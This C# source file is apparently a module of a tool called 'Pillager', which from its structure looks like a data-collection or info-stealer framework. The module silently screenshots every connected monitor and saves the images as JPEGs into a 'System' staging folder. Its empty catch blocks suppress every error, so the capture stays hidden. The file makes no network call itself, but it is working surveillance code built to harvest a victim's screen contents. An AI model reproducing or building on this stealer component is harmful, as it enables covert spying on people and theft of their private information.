using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using Pillager.Helper;

namespace Pillager.SystemInfos
{
    internal class ScreenShot : ICommand
    {
        public override void Save(string path)
        {
            try
            {
                string savepath = Path.Combine(path, "System");
                try
                {
                    Native.SetupDpiAwareness();
                }
                catch { }
                if (Screen.AllScreens.Length > 0)
                {
                    Directory.CreateDirectory(savepath);
                    for (int i = 0; i < Screen.AllScreens.Length; i++)
                    {
                        Screen screen = Screen.AllScreens[i];
                        using (Bitmap bitmap = new Bitmap(screen.Bounds.Width, screen.Bounds.Height, PixelFormat.Format32bppArgb))
                        {
                            using (Graphics graphics = Graphics.FromImage(bitmap))
                            {
                                graphics.CopyFromScreen(screen.Bounds.Left, screen.Bounds.Top, 0, 0, new Size(bitmap.Width, bitmap.Height), CopyPixelOperation.SourceCopy);
                            }
                            bitmap.Save(Path.Combine(savepath, "ScreenShot" + i + ".jpg"), ImageFormat.Jpeg);
                        }
                    }
                }
            }
            catch { }
        }
    }
}
